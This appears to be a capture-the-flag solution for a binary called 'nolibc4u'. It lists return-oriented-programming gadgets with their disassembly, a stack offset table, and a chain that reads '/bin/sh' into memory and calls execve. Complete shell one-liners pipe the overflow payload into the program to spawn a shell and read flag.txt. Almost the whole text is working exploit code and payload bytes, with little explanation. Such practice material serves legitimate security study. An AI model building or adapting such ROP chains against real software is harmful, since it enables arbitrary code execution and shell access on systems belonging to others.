Gadgets
==========================================================
syscall, pop rdx, pop rsi    - 0x418c77
  418c77:	0f 05                	syscall 

  418c79:	5a                   	pop    %rdx

  418c7a:	5e                   	pop    %rsi

  418c7b:	c3                   	retq   

pop rdi                      - 0x4016c8
  4016c7:	41 5f                	pop    %r15

  4016c9:	c3                   	retq   

mov rax, rdx                 - 0x402255
  402255:	48 89 d0             	mov    %rdx,%rax

  402258:	41 5c                	pop    %r12

  40225a:	c3                   	retq   

jmp $                        - 0x400ff9
  400ff8:	e9 eb fe ff ff       	jmpq 
  400ee8 <init_cacheinfo+0x108>


pop rdx, pop r10             - 0x418c53
  418c53:	5a                   	pop    %rdx

  418c54:	41 5a                	pop    %r10

  418c56:	c3                   	retq   

syscall                      - 0x4171e5
  4171e5:	0f 05                	syscall 

  4171e7:	48 3d 01 f0 ff ff    	cmp    $0xfffffffffffff001,%rax

  4171ed:	0f 83 7d 2d 00 00    	jae    419f70 <__syscall_error>

  4171f3:	c3                   	retq   

Call overview
==========================================================
Let avail = 0x6c0fd0 (GOT start)

read(0, avail, 25)
 User enters "/bin/sh\x00" + avail + "\x00\x00\x00\x00\x00\x00\x00\x00" + "\n"
execve(avail, avail + 8, 0)

ROP chain
==========================================================
Let offset 0x00 be where the retaddr is
It's at offset 0x40 + 0x8 = 0x48

Offset		Value		Meaning
----------------------------------------------------------
0x00		0x418c79	pop rdx, pop rsi
0x08		0x0		rdx = 0x0

0x18		0x402255	mov rax, rdx

0x28		0x418c79	pop rdx, pop rsi
0x30		0x19		rdx = 25
0x38		0x6c0fd0	rsi = avail

0x40		0x4016c8	pop rdi
0x48		0x0		rdi = 0

0x50		0x418c77	syscall, pop rdx, pop rsi
0x58		0x3b		rdx = 0x3b

0x68		0x402255	mov rax, rdx

0x78		0x418c79	pop rdx, pop rsi
0x80		0x0		rdx = 0
0x88		0x6c0fd8	rsi = avail + 8

0x90		0x4016c8	pop rdi
0x98		0x6c0fd0	rdi = avail

0xa0		0x418c77	syscall

0xb8		0x400ff9	jmp $

Exploit command
==========================================================
Pieces
----------------------------------------------------------
Padding:	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
Gadget 1:	\x79\x8c\x41\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@@@@@@@@
Gadget 2:	\x55\x22\x40\x00\x00\x00\x00\x00@@@@@@@@
Gadget 3:	\x79\x8c\x41\x00\x00\x00\x00\x00\x19\x00\x00\x00\x00\x00\x00\x00\xd0\x0f\x6c\x00\x00\x00\x00\x00
Gadget 4:	\xc8\x16\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
Gadget 5:	\x77\x8c\x41\x00\x00\x00\x00\x00\x3b\x00\x00\x00\x00\x00\x00\x00@@@@@@@@
Gadget 6:	\x55\x22\x40\x00\x00\x00\x00\x00@@@@@@@@
Gadget 7:	\x79\x8c\x41\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd8\x0f\x6c\x00\x00\x00\x00\x00
Gadget 8:	\xc8\x16\x40\x00\x00\x00\x00\x00\xd0\x0f\x6c\x00\x00\x00\x00\x00
Gadget 9:	\x77\x8c\x41\x00\x00\x00\x00\x00@@@@@@@@@@@@@@@@
Gadget 10:	\xf9\x0f\x40\x00\x00\x00\x00\x00

Working
----------------------------------------------------------
{ sleep 1; echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\x79\x8c\x41\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@@@@@@@@\x55\x22\x40\x00\x00\x00\x00\x00@@@@@@@@\x79\x8c\x41\x00\x00\x00\x00\x00\x19\x00\x00\x00\x00\x00\x00\x00\xd0\x0f\x6c\x00\x00\x00\x00\x00\xc8\x16\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x77\x8c\x41\x00\x00\x00\x00\x00\x3b\x00\x00\x00\x00\x00\x00\x00@@@@@@@@\x55\x22\x40\x00\x00\x00\x00\x00@@@@@@@@\x79\x8c\x41\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd8\x0f\x6c\x00\x00\x00\x00\x00\xc8\x16\x40\x00\x00\x00\x00\x00\xd0\x0f\x6c\x00\x00\x00\x00\x00\x77\x8c\x41\x00\x00\x00\x00\x00@@@@@@@@@@@@@@@@\xf9\x0f\x40\x00\x00\x00\x00\x00"; sleep 1; echo -e "/bin/sh\x00\xd0\x0f\x6c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"; sleep 1; echo "ls"; } | ./nolibc4u

Debug
----------------------------------------------------------
exit for syscall 1:	{ sleep 1; echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\x79\x8c\x41\x00\x00\x00\x00\x00\x3c\x00\x00\x00\x00\x00\x00\x00@@@@@@@@\x55\x22\x40\x00\x00\x00\x00\x00@@@@@@@@\x79\x8c\x41\x00\x00\x00\x00\x00\x19\x00\x00\x00\x00\x00\x00\x00\xd0\x0f\x6c\x00\x00\x00\x00\x00\xc8\x16\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x77\x8c\x41\x00\x00\x00\x00\x00\x3b\x00\x00\x00\x00\x00\x00\x00@@@@@@@@\x55\x22\x40\x00\x00\x00\x00\x00@@@@@@@@\x79\x8c\x41\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd8\x0f\x6c\x00\x00\x00\x00\x00\xc8\x16\x40\x00\x00\x00\x00\x00\xd0\x0f\x6c\x00\x00\x00\x00\x00\x77\x8c\x41\x00\x00\x00\x00\x00"; sleep 1; echo "/bin/sh\x00\xd0\x0f\x6c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"; sleep 1; echo "ls"; } | ./nolibc4u
exit for syscall 2:	{ sleep 1; echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\x79\x8c\x41\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@@@@@@@@\x55\x22\x40\x00\x00\x00\x00\x00@@@@@@@@\x79\x8c\x41\x00\x00\x00\x00\x00\x19\x00\x00\x00\x00\x00\x00\x00\xd0\x0f\x6c\x00\x00\x00\x00\x00\xc8\x16\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x77\x8c\x41\x00\x00\x00\x00\x00\x3c\x00\x00\x00\x00\x00\x00\x00@@@@@@@@\x55\x22\x40\x00\x00\x00\x00\x00@@@@@@@@\x79\x8c\x41\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd8\x0f\x6c\x00\x00\x00\x00\x00\xc8\x16\x40\x00\x00\x00\x00\x00\xd0\x0f\x6c\x00\x00\x00\x00\x00\x77\x8c\x41\x00\x00\x00\x00\x00"; sleep 1; echo "/bin/sh\x00\xd0\x0f\x6c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"; sleep 1; echo "ls"; } | ./nolibc4u

Final
----------------------------------------------------------
{ sleep 1; echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\x79\x8c\x41\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@@@@@@@@\x55\x22\x40\x00\x00\x00\x00\x00@@@@@@@@\x79\x8c\x41\x00\x00\x00\x00\x00\x19\x00\x00\x00\x00\x00\x00\x00\xd0\x0f\x6c\x00\x00\x00\x00\x00\xc8\x16\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x77\x8c\x41\x00\x00\x00\x00\x00\x3b\x00\x00\x00\x00\x00\x00\x00@@@@@@@@\x55\x22\x40\x00\x00\x00\x00\x00@@@@@@@@\x79\x8c\x41\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd8\x0f\x6c\x00\x00\x00\x00\x00\xc8\x16\x40\x00\x00\x00\x00\x00\xd0\x0f\x6c\x00\x00\x00\x00\x00\x77\x8c\x41\x00\x00\x00\x00\x00@@@@@@@@@@@@@@@@\xf9\x0f\x40\x00\x00\x00\x00\x00"; sleep 1; echo -e "/bin/sh\x00\xd0\x0f\x6c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"; sleep 1; echo "cat flag.txt"; } | ./nolibc4u